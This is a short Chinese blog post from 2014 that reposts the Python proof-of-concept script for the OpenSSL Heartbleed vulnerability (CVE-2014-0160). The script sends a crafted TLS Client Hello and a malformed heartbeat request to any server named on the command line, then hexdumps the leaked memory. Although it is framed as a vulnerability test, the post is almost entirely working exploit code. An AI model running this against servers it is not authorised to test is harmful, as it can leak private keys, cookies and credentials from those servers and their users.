title: '测试openssl漏洞脚本 openssl.py'
tags:
  - Python
  - 代码
  - 技术
id: 1052
categories:
  - Python
  - 技术实践
date: 2014-04-12 01:11:03
---

<pre class="brush:python;">
# Usage: python openssl.py domainname

#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage=&#39;%prog server [options]&#39;, description=&#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#39;)
options.add_option(&#39;-p&#39;, &#39;--port&#39;, type=&#39;int&#39;, default=443, help=&#39;TCP port to test (default: 443)&#39;)

def h2bin(x):
    return x.replace(&#39; &#39;, &#39;&#39;).replace(&#39;\n&#39;, &#39;&#39;).decode(&#39;hex&#39;)

hello = h2bin(&#39;&#39;&#39;
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
&#39;&#39;&#39;)

hb = h2bin(&#39;&#39;&#39; 
18 03 02 00 03
01 40 00
&#39;&#39;&#39;)

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = &#39; &#39;.join(&#39;%02X&#39; % ord(c) for c in lin)
        pdat = &#39;&#39;.join((c if 32 &lt;= ord(c) &lt;= 126 else &#39;.&#39; )for c in lin)
        print &#39;  %04x: %-48s %s&#39; % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = &#39;&#39;
    remain = length
    while remain &gt; 0:
        rtime = endtime - time.time() 
        if rtime &lt; 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print &#39;Unexpected EOF receiving record header - server closed connection&#39;
        return None, None, None
    typ, ver, ln = struct.unpack(&#39;&gt;BHH&#39;, hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print &#39;Unexpected EOF receiving record payload - server closed connection&#39;
        return None, None, None
    print &#39; ... received message: type = %d, ver = %04x, length = %d&#39; % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print &#39;No heartbeat response received, server likely not vulnerable&#39;
            return False

        if typ == 24:
            print &#39;Received heartbeat response:&#39;
            hexdump(pay)
            if len(pay) &gt; 3:
                print &#39;WARNING: server returned more data than it should - server is vulnerable!&#39;
            else:
                print &#39;Server processed malformed heartbeat, but did not return any extra data.&#39;
            return True

        if typ == 21:
            print &#39;Received alert:&#39;
            hexdump(pay)
            print &#39;Server returned error, likely not vulnerable&#39;
            return False

def main():
    opts, args = options.parse_args()
    if len(args) &lt; 1:
        options.print_help()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print &#39;Connecting...&#39;
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print &#39;Sending Client Hello...&#39;
    sys.stdout.flush()
    s.send(hello)
    print &#39;Waiting for Server Hello...&#39;
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print &#39;Server closed connection without sending Server Hello.&#39;
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    print &#39;Sending heartbeat request...&#39;
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s)

if __name__ == &#39;__main__&#39;:
    main()</pre>

	&nbsp;